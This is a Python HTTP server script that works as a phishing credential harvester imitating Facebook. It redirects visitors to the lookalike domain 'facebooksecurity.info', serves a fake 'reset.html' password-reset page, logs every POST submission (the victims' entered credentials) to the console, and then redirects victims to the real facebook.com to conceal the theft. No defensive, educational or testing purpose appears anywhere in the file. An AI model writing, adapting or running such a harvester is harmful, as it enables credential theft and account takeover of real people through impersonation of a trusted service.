from http.server import BaseHTTPRequestHandler, HTTPServer
import subprocess


# Create custom HTTPRequestHandler class
class MyRequestHandler(BaseHTTPRequestHandler):
    # Handle GET requests
    def do_GET(self):
        if self.path == '/mail':
            # Redirect to www.login.info if accessing server's IP directly
            self.send_response(302)
            self.send_header('Location', 'http://facebooksecurity.info:5050/')
            self.end_headers()
        else:
            # Serve reset.html for other requests
            print(f"Received GET request: {self.path}")
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            with open('reset.html', 'rb') as f:
                self.wfile.write(f.read())


    # Handle POST requests
    def do_POST(self):
        # Print the request method and path
        print(f"Received POST request: {self.path}")

        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        print("POST data:", post_data.decode())

        # Redirect to facebook.com
        self.send_response(302)
        self.send_header('Location', 'https://www.facebook.com')
        self.end_headers()


# Configure server
def run(server_class=HTTPServer, handler_class=MyRequestHandler, port=5050):
    server_address = ('', port)  # Host is empty string
    httpd = server_class(server_address, handler_class)
    print('Starting server...')
    httpd.serve_forever()


run()
